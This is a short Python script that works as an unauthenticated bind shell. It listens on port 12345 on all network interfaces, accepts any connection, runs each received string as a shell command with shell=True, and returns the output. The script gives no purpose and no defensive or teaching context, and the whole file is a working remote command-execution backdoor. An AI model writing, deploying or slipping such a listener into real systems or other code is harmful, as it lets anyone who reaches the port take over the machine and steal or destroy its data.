import socket
import subprocess

# Define the listening address and port
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345  # Choose a port for communication

def main():
    # Create a socket and bind it to the specified address and port
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    
    # Listen for incoming connections
    server_socket.listen(5)
    
    print(f"Listening on {HOST}:{PORT}")
    
    while True:
        # Accept incoming connections
        client_socket, addr = server_socket.accept()
        print(f"Accepted connection from {addr[0]}:{addr[1]}")
        
        while True:
            # Receive data from the client
            data = client_socket.recv(1024).decode('utf-8')
            
            if not data:
                break  # No more data, break the loop
            
            # Execute the received command and capture the output
            result = execute_command(data)
            
            # Send the command output back to the client
            client_socket.send(result.encode('utf-8'))
        
        # Close the client socket
        client_socket.close()

def execute_command(command):
    try:
        # Execute the command using the subprocess module
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    main()
